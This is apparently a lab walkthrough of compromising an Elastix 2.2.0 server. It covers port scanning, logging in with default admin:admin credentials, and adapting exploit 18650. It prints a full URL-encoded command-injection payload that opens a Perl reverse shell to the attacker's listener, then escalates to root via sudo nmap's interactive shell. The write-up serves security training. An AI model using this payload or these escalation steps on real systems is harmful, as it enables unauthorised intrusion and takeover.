Report

Report

1. Nmap SYN Stealth scan to look for open TCP ports.
SYN Stealth scan with service detection
`sudo nmap -p- 10.11.1.217`
![c3e08e5397a952b7bb754045190d1250.png](f9d115c1ae1c4596b785aa343a6174b2.png)



# 2. View port 443 in browser
Accept this risk and continue
[https://10.11.1.217](https://10.11.1.217)
![1bb7ba1aa81be78ded7340954517e481.png](c140f12129ed43f0b424337746c9522f.png)

It is an elastix login page
[https://10.11.1.217/](https://10.11.1.217/)
![2d89ffc10c734b4cc80d37a25bb5d31e.png](d9f13fea851a4c0c80a1768814dbb73e.png)

# 3. Search for default credentials
Google: `elastix default credentials`
![8a9c450cd49a034b3717885f31f07eed.png](9782c512d2044a09acc583ef8cc85e5f.png)

Visit the thread on elastix.org
[https://www.elastix.org/community/threads/default-passwords-not-password.8416/](https://www.elastix.org/community/threads/default-passwords-not-password.8416/)
![25814c172a100750b0a008ad0ac287d1.png](7be9d33920df4ea495370fbc1a6bcfa3.png)

# 4. Attempt to log into elastix
We saw in the previous step that admin:admin was a suggested credential. Let's try it.
[https://10.11.1.217/index.php](https://10.11.1.217/index.php)
![6a5afbf37621751ab9bb5d9b90331e88.png](292b84148fec4aaf937f299611555c67.png)

The admin:admin credentials work! Here is the System Dashboard
![784caa9c007c1358cd6d3c93d678e7ae.png](8bf943e198bc44adaa9b668430a3cf34.png)

# 5. Find the elastix version
Hover the mouse over the italicized i at the top right corner
![904b2128cde19e9b152e3a391ab961a1.png](ca646e7b28d54d8ca832aee78b80e080.png)

A pop-up menu will show. Click on 'version'. 
![c40453c7d44c2c801c46d6d3892b550c.png](c727b4777b6946fca9fdc4d277e55f02.png)
Another window will pop-up. We see it is Elastix 2.2.0
![2b55e43f887f79c4598a4e144ce89dc7.png](6b84a4a943a64cf5b7fae029edbd51e8.png)

Of note, is that it uses package name elastix 2.2.0
![d2f694dd1ff314c450550d87b74306c1.png](459e166670624ae0aa92c6621ca7de1a.png)

It also contains package name freePBX version 2.8.1
![62e5a0118b8e4d3d3d4fc0c6294b9e60.png](351bd38b2bd24a619409b7d9e40f022c.png)

# 6. Searchsploit elastix
A general search
`searchsploit elastix`
![4d0161ccd35c29e96280135b9fd3db81.png](61e8cc606183496cb0aa99c034ca78b1.png)

There is an RCE exploit with the same Elastix version 2.2.0. Download 18650
`searchsploit -m 18650`
![a07ca5ad9bf3880ee3918bf9f1322386.png](babc29f7670043a99f24007112cbcf38.png)

# 7. Modify exploit 18650
This is what the code looks like. It is an RCE and includes privesc to root.
`vi 18650.py`
![7a1153fada95a886360d0c66089b49f8.png](ce1c6b193f0b4cba9c63a5e9e9cd0631.png)

We will need to change some variables
![e304fca85d9ca7109f06a889e2d5f2ce.png](772fcf8733f9470d967fd8bd2205278b.png)

Change the rhost and lhost variables 
![9635e115316c4cbd1fcfaf1e6f951a42.png](45c0219b255845fda553d4e3c68300b0.png)

# 8. Start a netcat listener on port 443, since it is required by the exploit
`sudo nc -lvnp 443`
![c8295290762894a1e87b3b921a3ec811.png](a79076ebf0234990a6f4cbc74bedd24d.png)

# 9. Run exploit 18650
Unfortunately it produced an error with some messages I don't know how to fix.
`python 18650.py`
![d771cf80c5cd32eda6b5073b7288400c.png](46b67fbd83f34727b98cf31e66f8bb71.png)

# 10. Try executing the exploit by typing it directly into the browser. Remember that the netcat listener is still running.

This is the original string from the browser
`https://'+str(rhost)+'/recordings/misc/callme_page.php?action=c&callmenum='+str(extension)+'@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%22'+str(lhost)+'%3a'+str(lport)+'%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A`

Change the following variables. **Remember to remove the single quotes surrounding each of these variables**
rhost = 10.11.1.217
lhost = 192.168.119.214
lport = 443
extension = 1000


Browse to the site
`https://10.11.1.217/recordings/misc/callme_page.php?action=c&callmenum=1000@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%22192.168.119.214%3a443%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A`

The rendered page
![1a26878da6acb368f8b3c8042c6bb03e.png](49464c15fe21470091272d4956441290.png)

# 11. Notice we have a connection on the netcat listener
![33202f00bc79aebd2a4ebb0b7d2737f8.png](becd8b5880234cee8dbfb034b72ac557.png)

#12. Complete the rest of the exploit

Run the id command
`id`
![9e02b244fe322ca9d405d18ddc99805a.png](3a855c0a09f043b39cf8774a8ba3e003.png)

Start interactive nmap
`sudo nmap --interactive`
![5f1f5aef45f39ab4d416a9df6fa8d12a.png](7cfa2f36e4064ff9bfee115769285582.png)

Spawn a shell
`!sh`
![cdb43a9607e492f65ed67127f7594935.png](1726a83d054f4653bbb42c0b425ec1e2.png)

Check the id again. We are root!
`id`
![82c7810253ae61e734f323c247889149.png](9d4ceeea6d664b35961d63461f4d242a.png)